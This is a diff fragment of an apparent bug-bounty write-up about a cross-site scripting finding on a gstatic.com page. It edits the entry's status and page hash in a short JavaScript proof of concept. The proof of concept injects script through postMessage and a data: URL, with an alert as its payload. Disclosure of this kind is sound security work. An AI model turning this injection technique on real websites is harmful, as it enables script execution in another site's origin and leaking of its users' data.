@@ -763,13 +763,13 @@ f = new URLSearchParams(document.location.search) , g = new URL(f.get("url"));
 ### Attack scenario
 An attacker controlled website gains the "cutest cats online"
 
-### XSS on GSTATIC (Fixed, Awarded for individual impacts reported)
+### XSS on GSTATIC (WAI, Awarded for individual impacts reported)
 ```js
 let payload = `
 alert(window.origin);
 `;
 
-let f = document.createElement("iframe"); f.src = "https://www.gstatic.com/alkali/d78121f02d90dc923359a36d4b03dc5b4c2ae024.html"; document.body.appendChild(f); setTimeout(() => { f.contentWindow.postMessage({resourcePaths: {jsPath: "data:text/html,"+encodeURIComponent(payload)}}, "*"); }, 2000);
+let f = document.createElement("iframe"); f.src = "https://www.gstatic.com/alkali/43ecc24c54630568577e5fdcbc826f3153491684.html"; document.body.appendChild(f); setTimeout(() => { f.contentWindow.postMessage({resourcePaths: {jsPath: "data:text/html,"+encodeURIComponent(payload)}}, "*"); }, 2000);
 ```
 ### Attack scenario
 Leaking connection and DNS timings for gstatic.com resources via the performance API.
